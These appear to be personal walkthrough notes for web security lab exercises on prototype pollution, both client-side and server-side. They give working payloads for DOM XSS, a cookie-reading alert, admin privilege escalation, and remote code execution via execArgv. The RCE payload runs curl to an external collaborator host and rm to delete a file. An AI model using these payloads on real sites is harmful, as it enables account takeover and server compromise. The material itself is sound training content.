### Client-side prototype pollution via browser APIs

In browser, try injecting an arbitrary property via the quert string `/?__proto__[foo]=bar`

In console, enter Object.prototype, and see it says "foo": "bar"

There is a particular JS "searchLoggerConfigurable.js", where you have this code:

```js
   let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```

It says `transport_url` is unwrittable and unconfigurable, but doesn't define a `value`

So, instead of "bar", we'll use a script alert

`/?__proto__[value]=data:,alert(1);`

---
### DOM XSS via client-side prototype pollution

Validate same as previous exercise, and see there is a JS file "searchLogger.js" with this code:
```js
   let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
```

So, it's the same as previous, but now we need to inject in the transport_url property.
`/?__proto__[transport_url]=data:,alert(1);`

---
### DOM XSS via an alternative prototype pollution vector

In this case, you need to use an alternative payload to trigger the desired behavior: `/?__proto__.foo=bar`

There is a JS "searchLoggerAlternative.js" with this line:
```js
    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

```

That's our sink. The `manager.sequence` is passed to the eval, so let's craft the payload:
1. `/?__proto__.sequence=alert(1)`
2. `/?__proto__.sequence=alert(1)-`

---
### Client-side prototype pollution via flawed sanitization

Try any of this payloads until one works:
```text
/?__proto__.foo=bar
/?__proto__[foo]=bar
/?constructor.prototype.foo=bar
```

There is a file called "deparamSanitized.js" which uses the sanitizeKey() function defined in "searchLoggerFiltered.js" to strip dangerous properties, However, does not apply this recursively. 

Try injecting with one of this:
```text
/?__pro__proto__to__[foo]=bar 
/?__pro__proto__to__.foo=bar 
/?constconstructorructor[protoprototypetype][foo]=bar 
/?constconstructorructor.protoprototypetype.foo=bar`
```

Payload `/?__pro__proto__to__[transport_url]=data:,alert(1);`

---
### Client-side prototype pollution in third-party libraries

Start the DOM invader with the prototype pollution setting ON. 
Click on "Scan for gadgets", and then exploit. 
In the exploit server: 
```js
<script>
location="https://0a68005503b547b58463379a002a0029.web-security-academy.net/#__proto__[hitCallback]=data:alert%28document.cookie%29"
</script>
```

Send to victim. I added a "data:" to the payload, and it worked.

---
### Privilege escalation via server-side prototype pollution

Log in, and send the update form. Intercept it

and add a new property with this value:
`"__proto__": { "foo":"bar" }`

You can see there is an "isAdmin" property in the response. Let's try to change that from "false" to "true".

Replace "foo" -> isAdmin and "bar" ->  true.

Send it, login as admin. Remove carlos account.

---
### Detecting server-side prototype pollution without polluted property reflected

The response is not reflecting the same payload as before "foo" "bar".

Send a request that breaks the json, send it again, and you'll see the modifications has been done, but wasnt reflecting properly when you have a 200 status.

Now that you have a 500, can see the json has the added property.

---
### Bypassing flawed input filters for server-side prototype pollution

Add this payload: `"constructor": { "prototype": { "json spaces":10 } }`
And see there is a difference between the "pretty" and the "raw" tab. You added the 10 spaces, effectively polluting the prototype.

This is your payload: `"constructor": { "prototype": { "isAdmin":true } }`

Remove Carlos account.

---
### Remote code execution via server-side prototype pollution

Test with this:
`"__proto__": { "json spaces":10 }`

Send this: `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ] }` go to "Admin panel" > Run maintenance jobs, and receive it on the collaborator. 

Use this to delete:
`"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }`